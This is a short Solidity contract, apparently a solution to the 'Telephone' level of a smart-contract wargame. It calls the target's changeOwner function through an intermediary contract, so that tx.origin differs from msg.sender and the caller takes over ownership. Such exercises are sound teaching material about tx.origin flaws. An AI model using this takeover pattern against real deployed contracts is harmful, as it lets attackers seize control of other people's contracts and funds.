pragma solidity ^0.4.18;

import "./Telephone.sol";

contract HackTelephone {
    Telephone telephone;
    constructor(address _contractAddress){
        telephone = Telephone(_contractAddress);
    }

    function proxyChangeOwner(address _owner) {
        telephone.changeOwner(_owner);
    }
}
